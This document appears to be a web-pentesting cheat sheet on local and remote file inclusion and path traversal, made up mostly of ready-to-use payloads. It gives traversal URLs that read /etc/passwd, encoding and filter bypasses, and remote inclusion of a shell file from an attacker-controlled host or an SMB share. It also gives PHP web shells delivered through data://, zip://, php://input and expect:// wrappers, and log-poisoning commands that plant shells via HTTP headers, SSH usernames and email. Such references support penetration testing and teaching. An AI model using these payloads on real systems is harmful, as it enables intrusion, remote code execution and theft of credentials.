---
menu: LFI / RFI and Path Traversal
title: File Inclusion and Path Traversal - Web Applications Pentesting
---

# File Inclusion and Path Traversal

## At a Glance

#### File Inclusion

File inclusion is the method for applications,
and scripts,
to include local or remote files during run-time.
The vulnerability occurs when an application
generates a path to executable code
using an attacker-controlled variable,
giving the attacker
control over which file is executed.

There are two different types.
**Local File Inclusion** (LFI)
where the application
includes files on the current server.
And **Remote File Inclusion** (RFI)
where the application
downloads and execute files from a remote server.
[^wiki-file-inclusion]

#### Path Traversal

A path,
or directory,
traversal attack
consists of exploiting weak validation,
or sanitization,
of user-supplied data
allowing the attacker to read files,
or directories,
outside the context of the current application.

The use of these techniques
may lead to
information disclosure,
cross-site-Scripting (XSS),
and remote code execution (RCE).[^owasp-path-traversal]

## LFI

### Basic LFI

#### Absolute Path Traversal

```text
http://{{< param "war.rdomain" >}}/index.php?page=/etc/passwd
```

#### Relative Path Traversal

```text
http://{{< param "war.rdomain" >}}/index.php?page=../../../etc/passwd
```

### Null Byte

Sometimes applications append extra characters,
like file extensions,
to the input variable.
A null byte will make the application
ignore the following characters.

```text
http://{{< param "war.rdomain" >}}/index.php?page=../../../etc/passwd%00
```

{{<note>}}
PHP fixed the issue
in version 5.3.4. <https://bugs.php.net/bug.php?id=39863>
{{</note>}}

### Dot Truncation

In PHP,
filenames longer than 4096 bytes
will be truncated and,
characters after that,
ignored.

```text
http://{{< param "war.rdomain" >}}/index.php?page=../../../etc/passwd................[ADD MORE]
http://{{< param "war.rdomain" >}}/index.php?page=../../../etc/passwd\.\.\.\.\.\.\.\.[ADD MORE]
http://{{< param "war.rdomain" >}}/index.php?page=../../../etc/passwd/./././././././.[ADD MORE]
http://{{< param "war.rdomain" >}}/index.php?page=../../../[ADD MORE]../../../../../etc/passwd
```

{{<note>}}
In PHP:
`/etc/passwd` = `/etc//passwd` = `/etc/./passwd` = `/etc/passwd/` = `/etc/passwd/`
{{</note>}}

### Encoding

Manipulating variables that reference files
with “dot-dot-slash" (`../`) sequences and its variations,
or using absolute file paths,
may allow bypassing poorly implemented input filtering.
[^swissky-dt]

|     | URL   | Double URL | UTF-8 Unicode                 | 16 bits Unicode |
|-----|-------|------------|-------------------------------|-----------------|
| `.` | `%2e` | `%252e`    | `%c0%2e` `%e0%40%ae` `%c0%ae` | `%u002e`        |
| `/` | `%2f` | `%252f`    | `%c0%2f` `%e0%80%af` `%c0%af` | `%u2215`        |
| `\` | `%2c` | `%252c`    | `%c0%5c` `%c0%80%5c`          | `%u2216`        |

#### Encoded `../`
```text
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
```
#### Encoded `..\`
```text
%2e%2e%2c
%252e%252e%252c
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2216
```

#### Double URL Encoding

```text
http://{{< param "war.rdomain" >}}/index.php?page=%252e%252e%252fetc%252fpasswd
```

#### UTF-8 Encoding

```text
http://{{< param "war.rdomain" >}}/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```

### Bypass Filtering

```text
http://{{< param "war.rdomain" >}}/index.php?page=....//....//etc/passwd
http://{{< param "war.rdomain" >}}/index.php?page=..///////..////..//////etc/passwd
http://{{< param "war.rdomain" >}}/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```

### Bypass `../` removal

```text
..././
...\.\
```

### Bypass `../` replaced with `;`

```text
..;/
http://{{< param "war.rdomain" >}}/page.jsp?include=..;/..;/sensitive.txt
```

### Windows UNC Share [^unc-share]

Windows UNC shares can be injected
to redirect access to other resources.

```text
\\localhost\c$\windows\win.ini
```

## RFI

Most filter bypassing techniques for LFI
can be used for RFI.

### Basic RFI

```text
http://{{< param "war.rdomain" >}}/index.php?page=http://{{< param "war.ldomain" >}}/shell.txt
```

### Null Byte

```text
http://{{< param "war.rdomain" >}}/index.php?page=http://{{< param "war.ldomain" >}}/shell.txt%00
```

### Bypass `http(s)://` removal

```text
hhttp://thttp://thttp://phttp://:http://http:///http:///
hhttps://thttps://thttps://phttps://shttps://:https:///https:///https://
```

### Bypass `allow_url_include`

On Windows,
it is possible to bypass disabled `allow_url_include` and `allow_url_fopen`
by using `SMB`.
Simply including a script
located in an open share.

```text
http://{{< param "war.rdomain" >}}/index.php?page=\\{{< param "war.lhost" >}}\share\shell.php
```

## PHP Stream Wrappers

PHP provides many built-in wrappers
for various protocols,
to use with file functions
such as `fopen`, `copy`, `file_exists`,
and `filezise`.
[^php-wrappers]

### php://filter

[`php://filter`](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.filter) is a kind of meta-wrapper
that allows filtering a stream
before the content is read.
The resulting data
is the encoded version
of the given file's source code.

{{<note>}}
Multiple [filter](https://www.php.net/manual/en/filters.php) chains can be specified on one path,
chained using `|` or `/`.
{{</note>}}

#### Filter [string.rot13](https://www.php.net/manual/en/filters.string.php#filters.string.rot13).

```text
http://{{< param "war.rdomain" >}}/index.php?page=php://filter/read=string.rot13/resource=index.php
```

#### Filter [convert.base64](https://www.php.net/manual/en/filters.convert.php#filters.convert.base64).

```text
http://{{< param "war.rdomain" >}}/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://{{< param "war.rdomain" >}}/index.php?page=php://filter/convert.base64-encode/resource=index.php
```

#### Filter chaining [zlib.deflate](https://www.php.net/manual/en/filters.compression.php#filters.compression.zlib) and [convert.base64](https://www.php.net/manual/en/filters.convert.php#filters.convert.base64).

```text
http://{{< param "war.rdomain" >}}/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
```

##### Base64 decode and gzip inflate.

The resulting encoded string
can be decoded and inflated
by piping it into the following PHP script:

```sh
echo [BASE64-STR] | php -r 'echo gzinflate(base64_decode(file_get_contents("php://stdin")));'
```

### zip://

[zip://](https://www.php.net/manual/en/wrappers.compression.php) is a wrapper for zip compression streams.
To leverage the zip functionalities,
upload a zipped PHP script to the server
(with the preferred extension)
and decompress in the server
using the `zip://<zipfile>#<file>`,
being `<file>` the resulting decompressed file.

```sh
echo -n '<?php system($_GET['c']); ?>' > shell.php
zip shell.jpg shell.php
```
```text
http://{{< param "war.rdomain" >}}/index.php?page=zip://shell.jpg%23shell.php
```

### data://

[data://](https://www.php.net/manual/en/wrappers.data.php) is a wrapper for [RFC2397](https://tools.ietf.org/html/rfc2397),
or `data://` scheme.
The scheme allows the inclusion of small data items
as if it had been included externally.
[^ietf-rfc2397]

PHP Shell Script.

```sh
echo -n '<?php system($_GET['c']); ?>' | base64
PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=
```
```text
http://{{< param "war.rdomain" >}}/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=&c=ls
```

### expect://

[`expect://`](https://www.php.net/manual/en/wrappers.expect.php) wrapper provide access to processes'
`stdio`, `stdout` and `stderr`
via PTY.

```text
http://{{< param "war.rdomain" >}}/index.php?page=expect://ls
```

### php://input

[`php://input`](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.input) is a read-only stream that allows to read raw data
from the request body.

```sh
curl -X POST --data "<?php echo shell_exec('ls'); ?>" "http://{{< param "war.rdomain" >}}/index.php?page=php://input%00" -v
```
## The `proc` File System

The `proc` file system (`procfs`)
contains a hierarchy of special files
that represent the current state of the kernel.
It acts as an interface
to internal data structures in the kernel
for applications and users.

Because of its abstract properties,
it is also referred to as a [virtual file system](https://en.wikipedia.org/wiki/Virtual_file_system).

File within this directory
are listed as zero bytes in size,
even though,
can contain a large amount of data.
[^kernel-proc]

#### Process Directories

The `/proc` directory contains
one subdirectory for each process
running on the system,
which is named
after the process ID (PID).
Concurrently,
each of these directories
contains files to store information
about the respective process.
[^linux-man-proc]

#### `/proc/self` ([/fs/proc/self.c](https://github.com/torvalds/linux/blob/master/fs/proc/self.c))

The `/proc/self`
represents the currently scheduled PID.
In other words,
a symbolic link
to the currently running process's directory.

It is a self-referenced device driver,
or module,
maintained by the Kernel.

### Useful `/proc` entries

- `/proc/version`:
    Kernel version.
- `/proc/sched_debug`:
    Scheduling information
    and running processes
    per CPU.
- `/proc/mounts`:
    Mounted file systems.
- `/proc/net/arp`:
    ARP table.
- `/proc/net/route`:
    Routing table.
- `proc/net/tcp` / `udp`:
    TCP or UDP active connections.
- `/proc/net/fib_trie`:
    Routing tables trie.[^route-lookup]

### Useful `/proc/[PID]` entries

- `/proc/[PID]/cmdline`
    Process invocation command with parameters.

    It potentially exposes
    paths,
    usernames and passwords.
- `/proc/[PID]/environ`
    Environment variables.

    It potentially exposes
    paths,
    usernames and passwords.
- `/proc/[PID]/cwd`
    Process' current working directory.
- `/proc/[PID]/fd/[#]`
    File descriptors.

    Contains one entry
    for each file
    which the process has open.

### LFI2RCE - /proc

#### /proc/self/environ

`/proc/self/environ` contains user inputs
that turn it
in a useful volatile storage.
Apache stores an environment variable
for the `HTTP_USER_AGENT` header
to be used by
the self-contained modules.[^ush-lfi2rce]

```sh
curl "http://{{< param "war.rdomain" >}}/index.php?page=/proc/self/environ&c=id" -H "User-Agent" --data "<?php system($_GET['c']); ?>"
```

#### /proc/[PID]/fd/[FD] [^swissky-dt]

1. Upload A LOT of shells.
2. Include `http://{{< param "war.rdomain" >}}/index.php?page=/proc/$PID/fd/$fd`.

    Bruteforce the process ID (`$PID`)
    and file descriptor id (`$FD`)

## LFI2RCE - Log Poisoning

A log file
is a file that contains a record of events from an application.
A log poisoning attack
consists of triggering one of these events
with executable code as part of the logged data,
and successively,
through LFI,
include and execute the code.

{{<note>}}
It is recommended to first load the target log,
not only to verify the access
but to identify what data is being stored.

Administrators can modify the logged data
according to their needs.
{{</note>}}

### Apache

By default,
Apache maintains access and error logs.
The `error` log,
commonly,
register the `Referer` header,
while the `acccess` log,
the `User-Agent`.
[^apache-log]

#### Access Log
Make a valid request
with the code in the `User-Agent` header.

```sh
curl -H 'User-Agent' --data "<?php system($_GET['c']); ?>" "http://{{< param "war.rdomain" >}}" -v
```
#### Error Log
Make an invalid request,
an invalid inclusion for example,
with the suitable `Referer` header.

```sh
curl -H 'Referer' --data "<?php system($_GET['c']); ?>" "http://{{< param "war.rdomain" >}}/invalid#req" -v
```

{{<note>}}
The Apache logging API
escapes strings going to the logs.

Use single quotes (`'`)
since double quotes (`"`) are replaced escaped as `"quote";`
{{</note>}}

#### LFI

```txt
http://{{< param "war.rdomain" >}}/index.php?page=/path/to/access.log&c=id
```

#### Common Apache Log Paths

Log files can also be set to custom locations,
either globally,
or domain based if virtual hosting is enabled.

```text
/var/log/httpd/access_log
/var/log/httpd/error_log

/var/log/apache/access.log
/var/log/apache/error.log

/var/log/apache2/access.log
/var/log/apache2/error.log

/usr/local/apache/log/access_log
/usr/local/apache/log/error_log

/usr/local/apache2/log/access_log
/usr/local/apache2/log/error_log

/var/log/nginx/access.log
/var/log/nginx/error.log
```

### SSH

SSH logs the username of each connection.
Create a connection to SSH
with the suitable username.

```sh
ssh '<?php system('id'); ?>'@{{< param "war.rdomain" >}}
```

#### LFI

```txt
http://{{< param "war.rdomain" >}}/index.php?page=/path/to/sshd.log&c=id
```

#### Common SSH Log Paths

```text
/var/log/auth.log
/var/log/sshd.log
```

### Email

Email an internal account,
containing the script.

```sh
mail -s "<?php system($_GET['c']);?>" www-data@{{< param "war.rhost" >}} < /dev/null
```

#### LFI

```txt
http://{{< param "war.rdomain" >}}/index.php?page=/var/mail/www-data&c=id
```

## Further Reading

- [OWASP - Testing Directory Traversal File Include](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include.md)
- [BSidesMCR 2018: It's A PHP Unserialization Vulnerability Jim, But Not As We Know It by Sam Thomas](https://www.youtube.com/watch?v=GePBmsNJw6Y)
- [PayloadsAllTheThings Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders)

[^owasp-path-traversal]: “Path Traversal - OWASP.” OWASP, https://wiki.owasp.org/index.php/Path_Traversal.
[^wiki-file-inclusion]: Contributors to Wikimedia projects. “File Inclusion Vulnerability - Wikipedia.” Wikipedia, the Free Encyclopedia, Wikimedia Foundation, Inc., 24 Nov. 2006, https://en.wikipedia.org/wiki/File_inclusion_vulnerability.
[^swissky-dt]: swisskyrepo. “PayloadsAllTheThings / Directory Traversal.” GitHub, https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal.
[^unc-share]: “CWE-40: Path Traversal: ‘\\UNC\share\name\’ (Windows UNC Share) (4.1).” CWE -  Common Weakness Enumeration, https://cwe.mitre.org/data/definitions/40.html.
[^data-scheme]: “RFC 2397 - The ‘Data’ URL Scheme.” IETF Tools, https://tools.ietf.org/html/rfc2397.
[^apache-log]: “Log Files - Apache HTTP Server Version 2.4.” Welcome! - The Apache HTTP Server Project, https://httpd.apache.org/docs/2.4/logs.html.
[^php-wrappers]: “PHP: Supported Protocols and Wrappers - Manual.” PHP: Hypertext Preprocessor, https://www.php.net/manual/en/wrappers.php.
[^ietf-rfc2397]: “RFC 2397 - The ‘Data’ URL Scheme.” IETF Tools, https://tools.ietf.org/html/rfc2397.
[^kernel-proc]: “The /Proc Filesystem.” The Linux Kernel  Documentation, https://www.kernel.org/doc/html/latest/filesystems/proc.html.
[^route-lookup]: Bernat, Vincent. “IPv4 Route Lookup on Linux ⁕ Vincent Bernat.” MTU Ninja Vincent Bernat, https://vincent.bernat.ch/en/blog/2017-ipv4-route-lookup-linux.
[^linux-man-proc]: “Proc(5) - Linux Manual Page.” Michael Kerrisk - Man7.Org, https://man7.org/linux/man-pages/man5/proc.5.html.
[^ush-lfi2rce]: “LFI2RCE (Local File Inclusion to Remote Code Execution) Advanced Exploitation: /Proc Shortcuts.” Ush.It - a Beautiful Place, https://www.ush.it/2008/08/18/lfi2rce-local-file-inclusion-to-remote-code-execution-advanced-exploitation-proc-shortcuts/.
